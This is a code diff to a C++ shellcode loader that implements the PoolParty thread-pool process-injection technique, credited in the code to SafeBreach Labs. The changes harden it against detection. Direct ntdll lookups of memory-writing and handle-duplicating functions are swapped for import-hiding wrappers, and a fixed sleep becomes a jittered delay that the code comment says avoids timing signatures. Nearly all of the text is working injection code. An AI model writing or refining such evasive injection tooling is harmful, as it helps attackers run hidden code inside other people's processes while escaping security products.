@@ -37,7 +37,7 @@
 #include "../../include/loader.hpp"
 
 namespace erebus {
-#if CONFIG_INJECTION_TYPE == 5
+#if CONFIG_INJECTION_TYPE == 4
 
 	// ====================
 	// POOLPARTY STRUCTURES
@@ -192,18 +192,15 @@ namespace erebus {
 		IN const wchar_t* wsObjectType,
 		IN DWORD dwDesiredAccess)
 	{
-		HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+		HMODULE ntdll = ImportModule("ntdll.dll");
 		if (!ntdll) {
 			LOG_ERROR("Failed to get ntdll.dll handle");
 			return NULL;
 		}
-		
-		typeNtQueryInformationProcess NtQueryInformationProcess = 
-			(typeNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
-		typeNtQueryObject NtQueryObject = 
-			(typeNtQueryObject)GetProcAddress(ntdll, "NtQueryObject");
-		typeNtDuplicateObject NtDuplicateObject = 
-			(typeNtDuplicateObject)GetProcAddress(ntdll, "NtDuplicateObject");
+
+		ImportFunction(ntdll, NtQueryInformationProcess, typeNtQueryInformationProcess);
+		ImportFunction(ntdll, NtQueryObject, typeNtQueryObject);
+		ImportFunction(ntdll, NtDuplicateObject, typeNtDuplicateObject);
 
 		if (!NtQueryInformationProcess || !NtQueryObject || !NtDuplicateObject) {
 			LOG_ERROR("Failed to resolve NT functions in HijackProcessHandle");
@@ -355,17 +352,17 @@ namespace erebus {
 		LOG_INFO("========================================");
 		LOG_INFO("Credits: SafeBreach Labs - https://github.com/SafeBreach-Labs/PoolParty");
 
-		HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+		HMODULE ntdll = ImportModule("ntdll.dll");
 		if (!ntdll) {
 			LOG_ERROR("Failed to get ntdll.dll module handle");
 			return;
 		}
 
-		typeNtResumeThread NtResumeThread = (typeNtResumeThread)GetProcAddress(ntdll, "NtResumeThread");
-		typeNtClose NtClose = (typeNtClose)GetProcAddress(ntdll, "NtClose");
-		typeZwSetIoCompletion ZwSetIoCompletion = (typeZwSetIoCompletion)GetProcAddress(ntdll, "ZwSetIoCompletion");
-		typeNtWriteVirtualMemory NtWriteVirtualMemory = (typeNtWriteVirtualMemory)GetProcAddress(ntdll, "NtWriteVirtualMemory");
-		typeNtAllocateVirtualMemory NtAllocateVirtualMemory = (typeNtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
+		ImportFunction(ntdll, NtResumeThread, typeNtResumeThread);
+		ImportFunction(ntdll, NtClose, typeNtClose);
+		ImportFunction(ntdll, ZwSetIoCompletion, typeZwSetIoCompletion);
+		ImportFunction(ntdll, NtWriteVirtualMemory, typeNtWriteVirtualMemory);
+		ImportFunction(ntdll, NtAllocateVirtualMemory, typeNtAllocateVirtualMemory);
 
 		// Validate function pointers
 		if (!NtResumeThread || !NtClose || !ZwSetIoCompletion || !NtWriteVirtualMemory || !NtAllocateVirtualMemory) {
@@ -490,8 +487,8 @@ namespace erebus {
 		LOG_INFO("Shellcode will execute when thread pool worker dequeues the packet");
 		LOG_INFO("========================================");
 
-		// Give time for execution
-		Sleep(2000);
+		// Jittered delay for thread pool dequeue — avoids fixed timing signatures
+		Sleep(1500 + (GetTickCount() % 1000));
 
 	cleanup:
 		if (hIoCompletion != NULL && hIoCompletion != INVALID_HANDLE_VALUE) {
